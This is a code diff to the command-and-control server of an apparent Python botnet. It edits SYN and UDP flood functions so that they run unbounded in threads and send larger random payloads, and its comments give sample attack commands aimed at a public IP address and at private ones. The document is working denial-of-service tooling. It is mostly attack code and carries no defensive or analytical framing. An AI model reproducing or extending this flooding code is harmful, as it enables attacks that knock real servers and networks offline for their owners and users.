@@ -211,7 +211,7 @@ class Server(Colours): # this class is create a server to control botnet
 	def dos_attack(self):
 		#input target IP and Port
 
-		def _dos_attack_syn(destination_IP, destination_port, time:int):
+		def _dos_attack_syn(destination_IP, destination_port):
 			BUFFER_SIZE = 60000
 			BUFFER_SIZE = bytes(BUFFER_SIZE)
 			i = 1
@@ -226,9 +226,9 @@ class Server(Colours): # this class is create a server to control botnet
 				i = i + 1
 
 
-		def _dos_attack_udp(destination_IP, destination_port, time:int):
+		def _dos_attack_udp(destination_IP, destination_port):
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			bytes = random._urandom(1024)  # random the size of udp packet .
+			bytes = os.urandom(10240)  # random the size of udp packet .
 			s.connect((destination_IP, int(destination_port)))
 			i = 1
 			while True:
@@ -244,8 +244,8 @@ class Server(Colours): # this class is create a server to control botnet
 		print(help)
 		cmd = input("->>")
 		if "syn" in cmd:
-			#attack dos syn 27.64.57.85 1005 200 5000
-			#attack dos syn 192.168.1.48 443 200 5000
+			#attack dos syn 27.64.57.85 1006 200 5000
+			#attack dos syn 192.168.1.5 80 200 5000
 			data = cmd.replace("attack dos syn ","").split(" ")
 			print(data)
 			ip, port, times, thread = data
@@ -253,11 +253,11 @@ class Server(Colours): # this class is create a server to control botnet
 			print(type(ip))
 			self.run = True
 			for a in range(int(thread)):
-				_dos_attack_syn(ip, port, times)
+				Thread(target=_dos_attack_syn, args=(ip,port)).start()
 			self.run = False
 		elif "udp" in cmd:
-			#attack dos udp 27.64.57.85 1005 200 5000
-			# attack dos udp 192.168.1.48 443 200 5000
+			#attack dos udp 27.64.57.85 1006 200 5000
+			# attack dos udp 192.168.1. 80 200 5000
 			data = cmd.replace("attack dos udp ", "").split(" ")
 			print(data)
 			ip, port, times, thread = data
@@ -265,7 +265,7 @@ class Server(Colours): # this class is create a server to control botnet
 			print(type(ip))
 			self.run = True
 			for a in range(int(thread)):
-				Thread(target=_dos_attack_udp, args= (ip, port, times)).start()
+				Thread(target=_dos_attack_udp, args= (ip, port)).start()
 				#print(threading.enumerate())
 			self.run = False
 			# Thread(target=_dos_attack_udp, args=(ip, port, times)).start()
